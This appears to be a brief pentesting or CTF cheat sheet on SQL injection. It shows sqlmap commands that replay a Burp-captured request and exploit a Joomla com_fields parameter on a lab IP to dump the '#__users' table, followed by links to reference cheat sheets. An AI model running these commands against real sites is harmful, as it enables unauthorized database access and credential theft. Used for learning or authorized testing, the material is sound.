##### SQL injection against a Web site.  Copy Burp intercept to file and pass file to sqlmap.
```bash
sqlmap -r interceptfilename -p username
```

##### Joomla
```bash
sqlmap -u "http://10.10.201.23/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump -batch -p list[fullordering]
```

<https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet>
<https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/>